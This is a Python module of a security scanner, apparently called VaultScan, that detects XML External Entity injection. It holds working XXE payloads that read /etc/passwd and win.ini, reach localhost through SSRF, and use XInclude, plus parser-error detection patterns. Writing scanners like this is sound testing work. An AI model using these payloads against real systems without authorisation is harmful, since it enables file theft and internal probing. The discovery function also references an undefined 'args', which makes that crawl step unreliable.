#!/usr/bin/env python3
"""
VaultScan - XML External Entity (XXE) Injection Scanner
========================================================
Discovers XML-accepting endpoints (SOAP, REST, XML-RPC, forms) and tests
them for XXE vulnerabilities using entity expansion, parameter entities,
XInclude injection, and SSRF-via-XXE payloads.  Also checks whether
form endpoints can be tricked into parsing XML by manipulating the
Content-Type header.

Outputs JSON array of findings to stdout.
"""

import re
import sys
import os
import time
from typing import Dict, List, Optional, Set, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scan_utils import (
    base_argparser,
    is_mock_mode,
    output_findings,
    output_error,
    normalize_url,
    create_session,
    safe_request,
    rate_limited_request,
    crawl_same_domain,
    extract_forms,
    make_finding,
    DEFAULT_TIMEOUT,
    DEFAULT_DELAY,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
CATEGORY = "INJECTION"
MAX_CRAWL_PAGES = 5
MAX_XML_ENDPOINTS = 10

# Common API / XML paths to probe relative to the target root
COMMON_XML_PATHS = [
    "/api",
    "/api/xml",
    "/soap",
    "/wsdl",
    "/xml",
    "/xmlrpc.php",
    "/rest",
    "/ws",
    "/service",
    "/services",
    "/webservice",
    "/cgi-bin/xmlrpc.cgi",
]

# Content types that indicate XML processing
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]

# A benign well-formed XML document used to probe whether an endpoint accepts XML
BENIGN_XML = '<?xml version="1.0" encoding="UTF-8"?><root><test>1</test></root>'

# Error patterns that reveal XML parser internals (MEDIUM severity)
XML_ERROR_PATTERNS = [
    r"XML Parsing Error",
    r"SAXParseException",
    r"XMLSyntaxError",
    r"ENTITY",
    r"DOCTYPE",
    r"not well-formed",
    r"parser error",
    r"lxml\.etree",
    r"org\.xml\.sax",
    r"javax\.xml",
    r"xml\.parsers\.expat",
    r"simplexml_load_string",
    r"DOMDocument",
    r"XMLReader",
]

# ---------------------------------------------------------------------------
# XXE Payloads
# ---------------------------------------------------------------------------
XXE_PAYLOADS = [
    # Classic XXE - file read (Linux)
    {
        "name": "Classic XXE - /etc/passwd",
        "xml": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root><data>&xxe;</data></root>'
        ),
        "signatures": ["root:x:0:0", "root:x:0:", "/bin/bash", "/bin/sh"],
        "severity": "CRITICAL",
    },
    # Classic XXE - file read (Windows)
    {
        "name": "Classic XXE - win.ini",
        "xml": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<root><data>&xxe;</data></root>'
        ),
        "signatures": ["[fonts]", "[extensions]", "[boot loader]", "for 16-bit"],
        "severity": "CRITICAL",
    },
    # XXE via parameter entity
    {
        "name": "XXE Parameter Entity",
        "xml": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
            '<root>test</root>'
        ),
        "signatures": ["root:x:0:0"],
        "severity": "CRITICAL",
    },
    # XXE SSRF - attempt to reach internal network
    {
        "name": "XXE SSRF - localhost",
        "xml": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]>'
            '<root><data>&xxe;</data></root>'
        ),
        "signatures": ["<html", "<HTML", "<!DOCTYPE", "Apache", "nginx", "Welcome"],
        "severity": "HIGH",
    },
    # Billion laughs detection (safe version - only 3 levels)
    {
        "name": "XML Bomb Detection",
        "xml": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '<!ENTITY lol "lol">'
            '<!ENTITY lol2 "&lol;&lol;">'
            '<!ENTITY lol3 "&lol2;&lol2;">'
            ']><root>&lol3;</root>'
        ),
        "signatures": ["lollollollol"],
        "severity": "MEDIUM",
    },
    # XXE via XInclude
    {
        "name": "XInclude Injection",
        "xml": (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///etc/passwd"/>'
            '</foo>'
        ),
        "signatures": ["root:x:0:0"],
        "severity": "CRITICAL",
    },
]


# ---------------------------------------------------------------------------
# Discovery helpers
# ---------------------------------------------------------------------------
def _response_accepts_xml(resp) -> bool:
    """Return True if the response Content-Type indicates XML processing."""
    if resp is None:
        return False
    ct = resp.headers.get("Content-Type", "").lower()
    return any(xct in ct for xct in XML_CONTENT_TYPES)


def _has_xml_indicators(body: str) -> bool:
    """Return True if the response body hints at XML / SOAP capabilities."""
    indicators = [
        "wsdl", "WSDL",
        "SOAPAction", "soapAction",
        "soap:Envelope", "soap:Body",
        "xmlns:", "<?xml",
        "<wsdl:", "<xsd:",
    ]
    return any(ind in body for ind in indicators)


def _check_options_for_xml(session, url: str, timeout: int) -> bool:
    """Send an OPTIONS request and check if XML content types are accepted."""
    resp, err = safe_request(session, "OPTIONS", url, timeout=timeout)
    if err or resp is None:
        return False
    accept = resp.headers.get("Accept", "").lower()
    allow_ct = resp.headers.get("Accept-Post", "").lower()
    combined = accept + " " + allow_ct
    return any(xct in combined for xct in XML_CONTENT_TYPES)


def _probe_xml_post(session, url: str, delay: float, timeout: int) -> bool:
    """POST a benign XML body and check if the endpoint processes it."""
    headers = {"Content-Type": "application/xml"}
    resp, err = rate_limited_request(
        session, "POST", url, delay=delay, timeout=timeout,
        data=BENIGN_XML, headers=headers,
    )
    if err or resp is None:
        return False
    # If we get a non-405 response and the body isn't a generic error page,
    # the endpoint likely accepted the XML
    if resp.status_code == 405:
        return False
    ct = resp.headers.get("Content-Type", "").lower()
    body = resp.text.lower()
    # Positive signals: XML response, or body references XML parsing
    if any(xct in ct for xct in XML_CONTENT_TYPES):
        return True
    if any(kw in body for kw in ["xml", "soap", "element", "node", "parse"]):
        return True
    # A 200 with a very small body might indicate processing
    if resp.status_code == 200 and len(resp.text.strip()) > 0:
        return True
    return False


def discover_xml_endpoints(
    base_url: str,
    session,
    delay: float,
    timeout: int,
) -> List[str]:
    """
    Discover endpoints that accept XML input.

    Strategy:
      1. Probe common XML/SOAP/API paths with a benign XML POST.
      2. Crawl same-domain pages and check response Content-Types.
      3. Look for WSDL / SOAP indicators in crawled page bodies.
      4. Check OPTIONS for accepted content types.
      5. Extract form actions and probe them with XML POST.
    """
    xml_endpoints: Set[str] = set()

    # 1. Probe common paths
    for path in COMMON_XML_PATHS:
        if len(xml_endpoints) >= MAX_XML_ENDPOINTS:
            break
        url = base_url.rstrip("/") + path
        if _probe_xml_post(session, url, delay, timeout):
            xml_endpoints.add(url)

    # 2. Crawl pages
    try:
        pages = crawl_same_domain(
            base_url, session, delay=delay, timeout=timeout, max_pages=MAX_CRAWL_PAGES,
            depth=args.crawl_depth,
        )
    except Exception:
        pages = [base_url]

    for page_url in pages:
        if len(xml_endpoints) >= MAX_XML_ENDPOINTS:
            break

        resp, err = safe_request(session, "GET", page_url, timeout=timeout)
        if err or resp is None:
            continue

        # Check if the GET response itself is XML
        if _response_accepts_xml(resp):
            xml_endpoints.add(page_url)

        body = resp.text

        # Check for WSDL / SOAP indicators in body
        if _has_xml_indicators(body):
            xml_endpoints.add(page_url)

        # Check OPTIONS
        if _check_options_for_xml(session, page_url, timeout):
            xml_endpoints.add(page_url)

        # Extract form actions and probe them
        forms = extract_forms(page_url, body)
        for form in forms:
            if len(xml_endpoints) >= MAX_XML_ENDPOINTS:
                break
            action = form.get("action", page_url)
            if action and _probe_xml_post(session, action, delay, timeout):
                xml_endpoints.add(action)

    return list(xml_endpoints)[:MAX_XML_ENDPOINTS]


# ---------------------------------------------------------------------------
# XXE Testing
# ---------------------------------------------------------------------------
def test_xxe_payload(
    session,
    url: str,
    payload_dict: Dict,
    delay: float,
    timeout: int,
) -> Optional[Dict]:
    """
    Send an XXE payload to *url* as a POST with Content-Type: application/xml.
    Returns a finding dict if a signature matches, otherwise None.
    """
    headers = {"Content-Type": "application/xml"}
    resp, err = rate_limited_request(
        session, "POST", url, delay=delay, timeout=timeout,
        data=payload_dict["xml"], headers=headers,
    )
    if err or resp is None:
        return None

    body = resp.text

    # Check for payload signatures
    for sig in payload_dict["signatures"]:
        if sig in body:
            return make_finding(
                vulnerability=f"XXE Injection - {payload_dict['name']}",
                severity=payload_dict["severity"],
                location=url,
                evidence=(
                    f"Response contains '{sig}' after injecting "
                    f"external entity payload ({payload_dict['name']})"
                ),
                category=CATEGORY,
                raw_details={
                    "payload_name": payload_dict["name"],
                    "content_type": "application/xml",
                    "technique": "entity-expansion",
                    "matched_signature": sig,
                    "status_code": resp.status_code,
                },
            )

    # Check for XML parser error disclosure (lower severity)
    for pattern in XML_ERROR_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            return make_finding(
                vulnerability="XML Parser Error Disclosure",
                severity="MEDIUM",
                location=url,
                evidence=(
                    f"XXE payload '{payload_dict['name']}' triggered XML parser "
                    f"error: {m.group(0)[:200]}"
                ),
                category=CATEGORY,
                raw_details={
                    "payload_name": payload_dict["name"],
                    "content_type": "application/xml",
                    "technique": "error-based",
                    "error_match": m.group(0)[:300],
                    "status_code": resp.status_code,
                },
            )

    return None


def test_content_type_xxe(
    session,
    url: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test form endpoints by sending XML bodies with Content-Type: application/xml
    and text/xml, even if the endpoint normally accepts form data.  Some back-ends
    will switch to an XML parser based on the Content-Type header alone.
    """
    findings: List[Dict] = []
    content_types = ["application/xml", "text/xml"]

    for ct in content_types:
        for payload_dict in XXE_PAYLOADS:
            headers = {"Content-Type": ct}
            resp, err = rate_limited_request(
                session, "POST", url, delay=delay, timeout=timeout,
                data=payload_dict["xml"], headers=headers,
            )
            if err or resp is None:
                continue

            body = resp.text

            for sig in payload_dict["signatures"]:
                if sig in body:
                    findings.append(make_finding(
                        vulnerability=f"XXE via Content-Type Manipulation - {payload_dict['name']}",
                        severity=payload_dict["severity"],
                        location=url,
                        evidence=(
                            f"Endpoint processed XML when Content-Type was set to '{ct}'. "
                            f"Response contains '{sig}' (payload: {payload_dict['name']})"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "payload_name": payload_dict["name"],
                            "content_type": ct,
                            "technique": "content-type-manipulation",
                            "matched_signature": sig,
                            "status_code": resp.status_code,
                        },
                    ))
                    # One finding per content-type per endpoint is sufficient
                    return findings

    return findings


# ---------------------------------------------------------------------------
# Error-based XXE detection on arbitrary responses
# ---------------------------------------------------------------------------
def check_xml_error_disclosure(
    session,
    url: str,
    delay: float,
    timeout: int,
) -> Optional[Dict]:
    """
    Send a deliberately malformed XML body and check whether the response
    leaks XML parser details (class names, file paths, stack traces).
    """
    malformed_xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>'
    headers = {"Content-Type": "application/xml"}
    resp, err = rate_limited_request(
        session, "POST", url, delay=delay, timeout=timeout,
        data=malformed_xml, headers=headers,
    )
    if err or resp is None:
        return None

    body = resp.text
    for pattern in XML_ERROR_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            return make_finding(
                vulnerability="XML Parser Accepts External Entities",
                severity="MEDIUM",
                location=url,
                evidence=(
                    f"Malformed XXE payload triggered XML parser error revealing "
                    f"internal details: {m.group(0)[:200]}"
                ),
                category=CATEGORY,
                raw_details={
                    "content_type": "application/xml",
                    "technique": "error-based",
                    "error_match": m.group(0)[:300],
                    "status_code": resp.status_code,
                },
            )

    return None


# ---------------------------------------------------------------------------
# Deduplication
# ---------------------------------------------------------------------------
def _dedup_findings(findings: List[Dict]) -> List[Dict]:
    """Deduplicate findings by (location, payload_name/vulnerability)."""
    seen: Set[Tuple[str, str]] = set()
    unique: List[Dict] = []
    for f in findings:
        raw = f.get("raw_details", {})
        key = (
            f.get("location", ""),
            raw.get("payload_name", f.get("vulnerability", "")),
        )
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


# ---------------------------------------------------------------------------
# Mock Findings
# ---------------------------------------------------------------------------
def get_mock_findings(target: str) -> List[Dict]:
    """Return realistic mock findings for demonstration / testing."""
    return [
        make_finding(
            vulnerability="XXE Injection - File Read (/etc/passwd)",
            severity="CRITICAL",
            location=f"{target}/api/xml",
            evidence=(
                "Response contains 'root:x:0:0' after injecting "
                "external entity payload"
            ),
            category=CATEGORY,
            raw_details={
                "payload_name": "Classic XXE - /etc/passwd",
                "content_type": "application/xml",
                "technique": "entity-expansion",
            },
        ),
        make_finding(
            vulnerability="XML Parser Accepts External Entities",
            severity="HIGH",
            location=f"{target}/soap",
            evidence=(
                "XXE SSRF payload triggered response containing internal "
                "HTML content from localhost"
            ),
            category=CATEGORY,
            raw_details={
                "payload_name": "XXE SSRF - localhost",
                "technique": "ssrf-via-xxe",
            },
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = base_argparser(
        "VaultScan - XML External Entity (XXE) Injection Scanner"
    )
    args = parser.parse_args()

    target = normalize_url(args.target)

    # ---- Mock mode ----
    if is_mock_mode():
        output_findings(get_mock_findings(target))
        return

    # ---- Live scan ----
    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)
    delay = args.delay
    timeout = args.timeout
    findings: List[Dict] = []

    # Step 1: Discover XML-accepting endpoints
    xml_endpoints = discover_xml_endpoints(target, session, delay, timeout)

    # Step 2: Test each XML endpoint with XXE payloads
    for ep_url in xml_endpoints:
        for payload_dict in XXE_PAYLOADS:
            result = test_xxe_payload(session, ep_url, payload_dict, delay, timeout)
            if result:
                findings.append(result)

        # Also run error-based detection
        err_finding = check_xml_error_disclosure(session, ep_url, delay, timeout)
        if err_finding:
            findings.append(err_finding)

    # Step 3: Crawl pages and test form actions with Content-Type manipulation
    try:
        pages = crawl_same_domain(
            target, session, delay=delay, timeout=timeout, max_pages=MAX_CRAWL_PAGES,
            depth=args.crawl_depth,
        )
    except Exception:
        pages = [target]

    form_actions_tested: Set[str] = set()
    for page_url in pages:
        resp, err = safe_request(session, "GET", page_url, timeout=timeout)
        if err or resp is None:
            continue

        forms = extract_forms(page_url, resp.text)
        for form in forms:
            action = form.get("action", page_url)
            method = form.get("method", "GET").upper()
            if method != "POST" or action in form_actions_tested:
                continue
            # Skip endpoints already tested as XML endpoints
            if action in xml_endpoints:
                continue
            form_actions_tested.add(action)
            if len(form_actions_tested) > MAX_XML_ENDPOINTS:
                break
            ct_findings = test_content_type_xxe(session, action, delay, timeout)
            findings.extend(ct_findings)

    # Deduplicate and output
    output_findings(_dedup_findings(findings))


if __name__ == "__main__":
    main()
